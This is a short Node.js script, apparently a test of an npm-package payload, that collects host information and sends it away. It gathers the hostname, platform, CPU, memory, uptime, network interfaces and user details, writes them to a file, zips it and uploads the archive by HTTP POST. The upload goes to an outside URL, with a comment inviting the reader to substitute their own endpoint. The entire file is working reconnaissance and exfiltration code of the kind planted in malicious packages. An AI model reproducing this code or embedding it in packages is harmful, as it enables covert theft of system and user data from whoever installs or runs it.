const os = require('os');
const fs = require('fs');
const archiver = require('archiver');
const axios = require('axios');

// Gather host details
function getHostDetails() {
  return {
    hostname: os.hostname(),
    platform: os.platform(),
    arch: os.arch(),
    cpus: os.cpus(),
    totalmem: os.totalmem(),
    freemem: os.freemem(),
    uptime: os.uptime(),
    networkInterfaces: os.networkInterfaces(),
    userInfo: os.userInfo()
  };
}

// Upload the zip file using Axios
async function uploadZip() {
  const stream = fs.createReadStream('SnakeCPU.zip');
  await axios.post(
    'https://github.com/JacobAragon24/NPM-Package-Testing', // Replace with your actual upload endpoint
    stream,
    { headers: { 'Content-Type': 'application/zip' } }
  );
}

// Main function to run all steps
async function main() {
  // 1. Get host details
  const data = getHostDetails();

  // 2. Save to SnakeCPU.txt
  fs.writeFileSync('SnakeCPU.txt', JSON.stringify(data, null, 2));

  // 3. Archive SnakeCPU.txt as SnakeCPU.zip
  const output = fs.createWriteStream('SnakeCPU.zip');
  const zip = archiver('zip');
  zip.pipe(output);
  zip.file('SnakeCPU.txt', { name: 'SnakeCPU.txt' });
  zip.finalize();

  // 4. Upload when archive is finished
  output.on('close', async () => {
    await uploadZip();
    console.log('Upload complete.');
  });
}

main().catch(e => console.error(e));